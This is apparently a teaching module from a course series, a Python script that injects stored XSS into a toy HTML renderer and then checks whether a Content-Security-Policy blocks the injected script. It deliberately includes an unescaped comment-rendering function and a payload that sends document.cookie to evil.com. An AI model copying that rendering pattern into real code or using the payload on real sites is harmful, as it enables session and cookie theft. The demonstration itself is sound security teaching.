"""
Module 32: xss_csrf_on_toy_browser -- a REAL stored-XSS injection
against our own toy DOM builder (Module 19/20), then a real CSP check
(Module 30) deciding whether the injected script actually runs.

The vulnerability modeled here is the single most common real XSS
root cause: user-controlled input concatenated directly into an HTML
string with no escaping at all.
"""

from csp_enforcement import check_script, origin_of
from csp_parser import parse_csp
from html_tokenizer import tokenize
from tree_constructor import build_tree

PAGE_URL = "https://forum.example/thread/42"


def render_comment_page_VULNERABLE(comments: list) -> str:
    """THE BUG: raw string concatenation, no HTML-escaping of user
    input whatsoever -- a real, common, and genuinely exploitable
    pattern, not a contrived edge case."""
    items = "".join(f"<li>{comment}</li>" for comment in comments)
    return f"<div class=\"comments\"><ul>{items}</ul></div>"


def find_script_tags(node) -> list:
    """Walks the real, parsed DOM tree (not the token stream -- tokens
    are Module 19's job, this operates on Module 20's tree) looking for
    <script> elements."""
    found = []
    children = getattr(node, "children", None)
    if children is not None:
        for child in children:
            if getattr(child, "tag", None) == "script":
                found.append(child)
            found.extend(find_script_tags(child))
    return found


def run_xss_demo() -> None:
    attacker_comment = (
        'Nice post! <script>fetch("https://evil.com/steal?c=" + document.cookie)</script>'
    )
    legit_comment = "Totally normal comment, no HTML at all."

    html = render_comment_page_VULNERABLE([legit_comment, attacker_comment])
    print("=== Step 1: the vulnerable page's ACTUAL rendered HTML ===")
    print(f"  {html}\n")

    print("=== Step 2: this HTML really does parse into a <script> DOM node ===")
    dom = build_tree(tokenize(html))
    script_tags = find_script_tags(dom)
    print(f"  <script> elements found in the real, parsed DOM: {len(script_tags)}")
    for tag in script_tags:
        script_text = "".join(
            child.data for child in tag.children if hasattr(child, "data")
        )
        print(f"    injected script content: {script_text!r}")
    print(
        "  This proves the injection is structurally real -- an attacker-controlled "
        "<script> element now genuinely exists in this page's DOM, not merely as "
        "text sitting inertly inside a comment.\n"
    )

    print("=== Step 3a: BEFORE -- no CSP header at all ===")
    no_csp_policy = {}
    allowed, reason = check_script(no_csp_policy, origin_of(PAGE_URL), inline_code=script_text_of(script_tags[0]))
    print(f"  {reason}")
    print(f"  Would this script actually run in a real browser? {allowed}\n")

    print("=== Step 3b: AFTER -- a real CSP policy is added, with no 'unsafe-inline' ===")
    csp_header = "script-src 'self'"
    policy = parse_csp(csp_header)
    allowed, reason = check_script(policy, origin_of(PAGE_URL), inline_code=script_text_of(script_tags[0]))
    print(f"  CSP: {csp_header}")
    print(f"  {reason}")
    print(f"  Would this script actually run in a real browser? {allowed}")


def script_text_of(script_element) -> str:
    return "".join(child.data for child in script_element.children if hasattr(child, "data"))


if __name__ == "__main__":
    run_xss_demo()
